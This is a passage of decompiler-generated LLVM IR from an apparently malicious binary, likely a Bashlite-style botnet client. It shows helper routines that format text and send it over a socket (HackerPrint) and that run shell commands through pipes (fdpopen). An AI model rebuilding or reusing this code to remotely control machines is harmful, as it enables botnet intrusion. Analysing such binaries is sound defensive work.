dec_label_pc_8b38:                                ; preds = %dec_label_pc_8ad4
  %v2_8b3c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b40 = icmp eq i8 %v2_8b3c, 120
  br i1 %v7_8b40, label %dec_label_pc_8b48, label %dec_label_pc_8b9c

dec_label_pc_8b48:                                ; preds = %dec_label_pc_8b38
  %v1_8b4c = add i32 %stack_var_-36.133, 4
  %v1_8b58 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b58 = load i32, i32* %v1_8b58, align 4
  %v7_8b84 = call i32 @printi(i32 %tmp, i32 %v2_8b58, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b90 = add i32 %v7_8b84, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8b9c:                                ; preds = %dec_label_pc_8b38
  %v2_8ba0 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8ba4 = icmp eq i8 %v2_8ba0, 88
  br i1 %v7_8ba4, label %dec_label_pc_8bac, label %dec_label_pc_8c00

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8b9c
  %v1_8bb0 = add i32 %stack_var_-36.133, 4
  %v1_8bbc = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8bbc = load i32, i32* %v1_8bbc, align 4
  %v7_8be8 = call i32 @printi(i32 %tmp, i32 %v2_8bbc, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bf4 = add i32 %v7_8be8, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8c00:                                ; preds = %dec_label_pc_8b9c
  %v2_8c04 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c08 = icmp eq i8 %v2_8c04, 117
  br i1 %v7_8c08, label %dec_label_pc_8c10, label %dec_label_pc_8c64

dec_label_pc_8c10:                                ; preds = %dec_label_pc_8c00
  %v1_8c14 = add i32 %stack_var_-36.133, 4
  %v1_8c20 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c20 = load i32, i32* %v1_8c20, align 4
  %v7_8c4c = call i32 @printi(i32 %tmp, i32 %v2_8c20, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c58 = add i32 %v7_8c4c, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8c00
  %v2_8c68 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c6c = icmp eq i8 %v2_8c68, 99
  br i1 %v7_8c6c, label %dec_label_pc_8c74, label %dec_label_pc_8ce4

dec_label_pc_8c74:                                ; preds = %dec_label_pc_8c64
  %v1_8c78 = add i32 %stack_var_-36.133, 4
  %v1_8c84 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c84 = load i32, i32* %v1_8c84, align 4
  %v1_8c88 = urem i32 %v2_8c84, 256
  store i32 %v1_8c88, i32* %stack_var_-18, align 4
  %v6_8cac = call i32 @prints(i32 %tmp, i8* %v5_8cac, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c78)
  %v2_8cb8 = add i32 %v6_8cac, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8968, %dec_label_pc_89a4
  %stack_var_-32.2 = phi i8* [ %v5_8980, %dec_label_pc_89a4 ], [ %stack_var_-32.435, %dec_label_pc_8968 ]
  %v2_8cc8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8cc8 = zext i8 %v2_8cc8 to i32
  %v3_8cd4 = call i32 @printchar(i32* %arg1, i32 %v3_8cc8)
  %v1_8cdc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8ce4

dec_label_pc_8ce4:                                ; preds = %dec_label_pc_8c64, %dec_label_pc_8c74, %dec_label_pc_8c10, %dec_label_pc_8bac, %dec_label_pc_8b48, %dec_label_pc_8ae4, %dec_label_pc_8aa8, %dec_label_pc_8cc4
  %stack_var_-44.0 = phi i32 [ %v1_8cdc, %dec_label_pc_8cc4 ], [ %v2_8ac8, %dec_label_pc_8aa8 ], [ %v2_8b2c, %dec_label_pc_8ae4 ], [ %v2_8b90, %dec_label_pc_8b48 ], [ %v2_8bf4, %dec_label_pc_8bac ], [ %v2_8c58, %dec_label_pc_8c10 ], [ %v2_8cb8, %dec_label_pc_8c74 ], [ %stack_var_-44.132, %dec_label_pc_8c64 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8cc4 ], [ %v1_8a74, %dec_label_pc_8aa8 ], [ %v1_8ae8, %dec_label_pc_8ae4 ], [ %v1_8b4c, %dec_label_pc_8b48 ], [ %v1_8bb0, %dec_label_pc_8bac ], [ %v1_8c14, %dec_label_pc_8c10 ], [ %v1_8c78, %dec_label_pc_8c74 ], [ %stack_var_-36.133, %dec_label_pc_8c64 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8cc4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8aa8 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ae4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b48 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bac ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c10 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c74 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c64 ]
  %v4_8ce4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8ce8 = add i32 %v4_8ce4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8ce8 to i8*
  %v2_8cf4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cf8 = icmp eq i8 %v2_8cf4, 0
  br i1 %v2_8cf8, label %dec_label_pc_8d00, label %dec_label_pc_8968

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8978, %dec_label_pc_8ce4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8978 ], [ %stack_var_-44.0, %dec_label_pc_8ce4 ]
  %v2_8d04 = icmp eq i32* %arg1, null
  br i1 %v2_8d04, label %dec_label_pc_8d1c, label %dec_label_pc_8d0c

dec_label_pc_8d0c:                                ; preds = %dec_label_pc_8d00
  %v2_8d10 = load i32, i32* %arg1, align 4
  %v3_8d18 = inttoptr i32 %v2_8d10 to i8*
  store i8 0, i8* %v3_8d18, align 1
  br label %dec_label_pc_8d1c

dec_label_pc_8d1c:                                ; preds = %dec_label_pc_8d00, %dec_label_pc_8d0c
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89e0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8980, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8d1c, { 1, 0 }
  uselistorder label %dec_label_pc_8d00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8ce4, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8aa8, { 1, 0 }
  uselistorder label %dec_label_pc_8a60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a50, { 1, 0 }
  uselistorder label %dec_label_pc_89dc, { 1, 0 }
  uselistorder label %dec_label_pc_8968, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36164, i32* %stack_var_-20, align 4
  %v2_8d40 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d40, i32* @fp, align 4
  %v4_8d4c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d60 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d4c)
  ret i32 %v4_8d60

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d80 = load i32, i32* @fp, align 4
  store i32 36232, i32* %stack_var_-16, align 4
  %v2_8d84 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d84, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d90 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8da8 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d90)
  store i32 %v3_8d80, i32* @fp, align 4
  ret i32 %v4_8da8

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8dc4 = load i32, i32* @r2, align 4
  store i32 %v6_8dc4, i32* %stack_var_-8, align 4
  %v3_8dc8 = load i32, i32* @fp, align 4
  store i32 36304, i32* %stack_var_-16, align 4
  %v2_8dcc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dcc, i32* @fp, align 4
  %v1_8ddc = call i32 @malloc(i32 2048)
  store i32 %v1_8ddc, i32* %stack_var_-44, align 4
  %v3_8df8 = inttoptr i32 %v1_8ddc to i8*
  %v4_8df8 = call i32 @__GI_memset(i8* %v3_8df8, i32 0, i32 2048)
  %v2_8e04 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e24 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8e04)
  %v3_8e2c = call i32 @strlen(i8* %v3_8df8)
  %v2_8e3c = add i32 %v3_8e2c, %v1_8ddc
  %v3_8e44 = inttoptr i32 %v2_8e3c to i8*
  store i8 10, i8* %v3_8e44, align 1
  %v3_8e4c = call i32 @strlen(i8* %v3_8df8)
  %v4_8e64 = call i32 @__libc_send(i32 %arg1, i32 %v1_8ddc, i32 %v3_8e4c, i32 16384)
  store i32 %v1_8ddc, i32* @r0, align 4
  %v0_8e74 = call i32 @free()
  store i32 %v3_8dc8, i32* @fp, align 4
  ret i32 %v4_8e64

; uselistorder directives
  uselistorder i8* %v3_8df8, { 1, 0, 2 }
  uselistorder i32 %v1_8ddc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e90 = load i32, i32* @fp, align 4
  store i32 36504, i32* %stack_var_-4, align 4
  %v2_8e94 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e94, i32* @fp, align 4
  %v2_8ea8 = load i8, i8* %arg2, align 1
  %v7_8eac = icmp eq i8 %v2_8ea8, 114
  br i1 %v7_8eac, label %dec_label_pc_8ec4, label %dec_label_pc_8eb4

dec_label_pc_8eb4:                                ; preds = %entry
  %v2_8eb8 = load i8, i8* %arg2, align 1
  %v7_8ebc = icmp eq i8 %v2_8eb8, 119
  br i1 %v7_8ebc, label %dec_label_pc_8ec4, label %dec_label_pc_8ed8

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8eb4, %entry
  %v1_8ec8 = add i32 %tmp, 1
  %v1_8ecc = inttoptr i32 %v1_8ec8 to i8*
  %v2_8ecc = load i8, i8* %v1_8ecc, align 1
  %v2_8ed0 = icmp eq i8 %v2_8ecc, 0
  br i1 %v2_8ed0, label %dec_label_pc_8ee4, label %dec_label_pc_8ed8

dec_label_pc_8ed8:                                ; preds = %dec_label_pc_8eb4, %dec_label_pc_8ec4
  br label %dec_label_pc_90f0

dec_label_pc_8ee4:                                ; preds = %dec_label_pc_8ec4
  %v2_8ee4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8eec = call i32 @__GI_pipe(i32 %v2_8ee4)
  %v1_8ef4 = icmp slt i32 %v1_8eec, 0
  br i1 %v1_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ee4
  br label %dec_label_pc_90f0

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ee4
  %v2_8f0c = load i32, i32* @global_var_364e4.41, align 4
  %v2_8f10 = icmp eq i32 %v2_8f0c, 0
  br i1 %v2_8f10, label %dec_label_pc_8f18, label %dec_label_pc_8f98

dec_label_pc_8f18:                                ; preds = %dec_label_pc_8f08
  %v0_8f18 = call i32 @getdtablesize()
  %v5_8f2c = icmp sgt i32 %v0_8f18, 0
  br i1 %v5_8f2c, label %dec_label_pc_8f3c, label %dec_label_pc_8f30

dec_label_pc_8f30:                                ; preds = %dec_label_pc_8f18
  br label %dec_label_pc_90f0

dec_label_pc_8f3c:                                ; preds = %dec_label_pc_8f18
  %v3_8f40 = mul i32 %v0_8f18, 4
  %v1_8f48 = call i32 @malloc(i32 %v3_8f40)
  store i32 %v1_8f48, i32* @global_var_364e4.41, align 4
  %v2_8f64 = icmp eq i32 %v1_8f48, 0
  br i1 %v2_8f64, label %dec_label_pc_8f6c, label %dec_label_pc_8f78

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f3c
  br label %dec_label_pc_90f0

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8f3c
  %v3_8f94 = inttoptr i32 %v1_8f48 to i8*
  %v4_8f94 = call i32 @__GI_memset(i8* %v3_8f94, i32 0, i32 %v3_8f40)
  br label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f08, %dec_label_pc_8f78
  %v0_8f98 = call i32 @__vfork()
  %v7_8fb0 = icmp eq i32 %v0_8f98, -1
  br i1 %v7_8fb0, label %dec_label_pc_8fc8, label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f98
  %v2_8fbc = icmp eq i32 %v0_8f98, 0
  br i1 %v2_8fbc, label %dec_label_pc_8fec, label %dec_label_pc_908c

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f98
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fd0 = call i32 @__GI___libc_close(i32 %v3_8fc8)
  %v1_8fdc = call i32 @__GI___libc_close(i32 %tmp4)
  br label %dec_label_pc_90f0

dec_label_pc_8fec:                                ; preds = %dec_label_pc_8fb8
  %v3_8ff0 = load i8, i8* %arg2, align 1
  %v7_8ff4 = icmp eq i8 %v3_8ff0, 114
  br i1 %v7_8ff4, label %dec_label_pc_8ffc, label %dec_label_pc_9034

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fec
  %v7_9000 = icmp eq i32 %tmp4, 1
  br i1 %v7_9000, label %dec_label_pc_9024, label %dec_label_pc_9008

dec_label_pc_9008:                                ; preds = %dec_label_pc_8ffc
  %v4_9014 = call i32 @dup2(i32 %tmp4, i32 1, i32 %tmp)
  %v1_9020 = call i32 @__GI___libc_close(i32 %tmp4)
  br label %dec_label_pc_9024

dec_label_pc_9024:                                ; preds = %dec_label_pc_8ffc, %dec_label_pc_9008
  %v3_9024 = load i32, i32* %stack_var_-32, align 4
  %v1_902c = call i32 @__GI___libc_close(i32 %v3_9024)
  br label %dec_label_pc_9068

dec_label_pc_9034:                                ; preds = %dec_label_pc_8fec
  %v3_9034 = load i32, i32* %stack_var_-32, align 4
  %v2_9038 = icmp eq i32 %v3_9034, 0
  br i1 %v2_9038, label %dec_label_pc_905c, label %dec_label_pc_9040

dec_label_pc_9040:                                ; preds = %dec_label_pc_9034
  %v4_904c = call i32 @dup2(i32 %v3_9034, i32 0, i32 %tmp)
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__GI___libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9034, %dec_label_pc_9040
  %v1_9064 = call i32 @__GI___libc_close(i32 %tmp4)
  br label %dec_label_pc_9068

dec_label_pc_9068:                                ; preds = %dec_label_pc_9024, %dec_label_pc_905c
  %v8_9080 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_2365c.43 to i32), i32 ptrtoint ([3 x i8]* @global_var_23664.45 to i32), i32 ptrtoint ([3 x i8]* @global_var_23668.47 to i32), i32 %arg1, i32 0)
  %v1_9088 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_908c

dec_label_pc_908c:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_9068
  %v2_9090 = load i8, i8* %arg2, align 1
  %v7_9094 = icmp eq i8 %v2_9090, 114
  br i1 %v7_9094, label %dec_label_pc_909c, label %dec_label_pc_90b4

dec_label_pc_909c:                                ; preds = %dec_label_pc_908c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90ac = call i32 @__GI___libc_close(i32 %tmp4)
  br label %dec_label_pc_90c8

dec_label_pc_90b4:                                ; preds = %dec_label_pc_908c
  %v3_90bc = load i32, i32* %stack_var_-32, align 4
  %v1_90c4 = call i32 @__GI___libc_close(i32 %v3_90bc)
  br label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %dec_label_pc_909c, %dec_label_pc_90b4
  %stack_var_-40.0 = phi i32 [ %v3_909c, %dec_label_pc_909c ], [ %tmp4, %dec_label_pc_90b4 ]
  %v3_90cc = mul i32 %stack_var_-40.0, 4
  %v2_90d8 = load i32, i32* @global_var_364e4.41, align 4
  %v2_90dc = add i32 %v2_90d8, %v3_90cc
  %v2_90e4 = inttoptr i32 %v2_90dc to i32*
  store i32 %v0_8f98, i32* %v2_90e4, align 4
  br label %dec_label_pc_90f0

dec_label_pc_90f0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8f6c, %dec_label_pc_8f30, %dec_label_pc_8efc, %dec_label_pc_8ed8, %dec_label_pc_90c8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f6c ], [ -1, %dec_label_pc_8fc8 ], [ %stack_var_-40.0, %dec_label_pc_90c8 ], [ -1, %dec_label_pc_8f30 ], [ -1, %dec_label_pc_8ed8 ]
  store i32 %v3_8e90, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f98, { 1, 2, 0 }
  uselistorder i32 %v3_8f40, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90f0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90c8, { 1, 0 }
  uselistorder label %dec_label_pc_908c, { 1, 0 }
  uselistorder label %dec_label_pc_9068, { 1, 0 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_9024, { 1, 0 }
  uselistorder label %dec_label_pc_8f98, { 1, 0 }
  uselistorder label %dec_label_pc_8ed8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_912c = load i32, i32* @global_var_364e4.41, align 4
  %v2_9130 = icmp eq i32 %v2_912c, 0
  br i1 %v2_9130, label %dec_label_pc_9284, label %dec_label_pc_9138

dec_label_pc_9138:                                ; preds = %entry
  %v3_913c = mul i32 %arg1, 4
  %v2_914c = add i32 %v2_912c, %v3_913c
  %v1_9150 = inttoptr i32 %v2_914c to i32*
  %v2_9150 = load i32, i32* %v1_9150, align 4
  %v2_9154 = icmp eq i32 %v2_9150, 0
  br i1 %v2_9154, label %dec_label_pc_9284, label %dec_label_pc_9168

dec_label_pc_9168:                                ; preds = %dec_label_pc_9138
  %v1_916c = call i32 @__GI___libc_close(i32 %arg1)
  %v2_9170 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9178 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9170, i32 2)
  %v2_9198 = call i32 @__GI_sigaddset(i32 %v2_9170, i32 3)
  %v2_91a8 = call i32 @__GI_sigaddset(i32 %v2_9170, i32 1)
  %v2_91b0 = ptrtoint i32* %stack_var_-28 to i32
  %v4_91bc = call i32 @__GI_sigprocmask(i32 0, i32* nonnull %stack_var_-36, i32 %v2_91b0)
  %v2_91dc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91c0

dec_label_pc_91c0:                                ; preds = %dec_label_pc_9204, %dec_label_pc_9168
  %v2_91d0 = load i32, i32* @global_var_364e4.41, align 4
  %v2_91d4 = add i32 %v2_91d0, %v3_913c
  %v1_91d8 = inttoptr i32 %v2_91d4 to i32*
  %v2_91d8 = load i32, i32* %v1_91d8, align 4
  %v3_91ec = call i32 @__libc_waitpid(i32 %v2_91d8, i32 %v2_91dc, i32 0)
  %v3_91fc = icmp eq i32 %v3_91ec, -1
  %v8_91fc = icmp eq i32 %v3_91ec, -1
  br i1 %v3_91fc, label %dec_label_pc_9204, label %dec_label_pc_9218

dec_label_pc_9204:                                ; preds = %dec_label_pc_91c0
  %v0_9204 = call i32 @__GI___errno_location()
  %v1_920c = inttoptr i32 %v0_9204 to i32*
  %v2_920c = load i32, i32* %v1_920c, align 4
  %v7_9210 = icmp eq i32 %v2_920c, 4
  br i1 %v7_9210, label %dec_label_pc_91c0, label %dec_label_pc_9218

dec_label_pc_9218:                                ; preds = %dec_label_pc_91c0, %dec_label_pc_9204
  %v4_9228 = call i32 @__GI_sigprocmask(i32 2, i32* nonnull %stack_var_-28, i32 0)
  %v3_9230 = mul i32 %tmp6, 4
  %v2_923c = load i32, i32* @global_var_364e4.41, align 4
  %v2_9240 = add i32 %v2_923c, %v3_9230
  %v2_9248 = inttoptr i32 %v2_9240 to i32*
  store i32 0, i32* %v2_9248, align 4
  br i1 %v8_91fc, label %dec_label_pc_9284, label %dec_label_pc_9258

dec_label_pc_9258:                                ; preds = %dec_label_pc_9218
  %v3_9258 = load i32, i32* %stack_var_-40, align 4
  %v1_9264 = and i32 %v3_9258, 65280
  %v3_92681 = udiv i32 %v1_9264, 256
  br label %dec_label_pc_9284

dec_label_pc_9284:                                ; preds = %dec_label_pc_9258, %dec_label_pc_9218, %entry, %dec_label_pc_9138
  %storemerge = phi i32 [ -1, %dec_label_pc_9138 ], [ -1, %entry ], [ %v3_92681, %dec_label_pc_9258 ], [ -1, %dec_label_pc_9218 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_913c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_364e4.41, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9284, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_9218, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  br label %dec_label_pc_930c

dec_label_pc_92cc:                                ; preds = %dec_label_pc_931c
  store i32 %v2_9328, i32* @r3, align 4
  store i32 %v2_9328, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_92e8 = call i32 @__libc_read(i32 %arg3)
  %v1_92f8 = add nuw i32 %storemerge25, 1
  %v7_9304 = icmp eq i32 %v1_92e8, 1
  br i1 %v7_9304, label %dec_label_pc_930c, label %dec_label_pc_933c

dec_label_pc_930c:                                ; preds = %entry, %dec_label_pc_92cc
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92f8, %dec_label_pc_92cc ]
  %v6_9318 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_9318, label %dec_label_pc_931c, label %dec_label_pc_933c

dec_label_pc_931c:                                ; preds = %dec_label_pc_930c
  %v2_9328 = add i32 %storemerge25, %arg1
  %v1_932c = add i32 %v2_9328, -1
  %v1_9330 = inttoptr i32 %v1_932c to i8*
  %v2_9330 = load i8, i8* %v1_9330, align 1
  %v7_9334 = icmp eq i8 %v2_9330, 10
  br i1 %v7_9334, label %dec_label_pc_933c, label %dec_label_pc_92cc

dec_label_pc_933c:                                ; preds = %dec_label_pc_931c, %dec_label_pc_930c, %dec_label_pc_92cc
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_931c ], [ 1, %dec_label_pc_930c ], [ %v1_92e8, %dec_label_pc_92cc ]
  %v2_9340 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9340, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_9328, { 2, 0, 1 }
  uselistorder i32 %v1_92e8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_930c, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93c43 = load i8, i8* %arg1, align 1
  %v2_93c85 = icmp eq i8 %v2_93c43, 0
  br i1 %v2_93c85, label %dec_label_pc_93dc, label %dec_label_pc_93d0

dec_label_pc_9390:                                ; preds = %dec_label_pc_93d0
  %v3_9394 = mul i32 %stack_var_-20.07, 16
  %v2_939c = load i8, i8* %stack_var_-28.06, align 1
  %v3_939c = zext i8 %v2_939c to i32
  %v4_93a8 = mul nuw nsw i32 %v3_939c, 4
  %v5_93a8 = add i32 %v4_93a8, ptrtoint (i32* @global_var_2366c.50 to i32)
  %v6_93a8 = inttoptr i32 %v5_93a8 to i32*
  %v7_93a8 = load i32, i32* %v6_93a8, align 4
  %v2_93ac = or i32 %v7_93a8, %v3_9394
  %v1_93b8 = add i32 %v4_93c08, 1
  %v5_93bc = inttoptr i32 %v1_93b8 to i8*
  %v2_93c4 = load i8, i8* %v5_93bc, align 1
  %v2_93c8 = icmp eq i8 %v2_93c4, 0
  br i1 %v2_93c8, label %dec_label_pc_93dc, label %dec_label_pc_93d0

dec_label_pc_93d0:                                ; preds = %entry, %dec_label_pc_9390
  %v4_93c08 = phi i32 [ %v1_93b8, %dec_label_pc_9390 ], [ %tmp, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_93ac, %dec_label_pc_9390 ], [ 0, %entry ]
  %stack_var_-28.06 = phi i8* [ %v5_93bc, %dec_label_pc_9390 ], [ %arg1, %entry ]
  %v1_93d4 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_93d4, label %dec_label_pc_93dc, label %dec_label_pc_9390

dec_label_pc_93dc:                                ; preds = %dec_label_pc_9390, %dec_label_pc_93d0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_93ac, %dec_label_pc_9390 ], [ %stack_var_-20.07, %dec_label_pc_93d0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93d0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93f8 = load i32, i32* @r4, align 4
  %v6_93f8 = load i32, i32* @fp, align 4
  store i32 37888, i32* %stack_var_-4, align 4
  %v2_93fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93fc, i32* @fp, align 4
  %v2_9410 = load i8, i8* %arg1, align 1
  %v7_941c = icmp eq i8 %v2_9410, 42
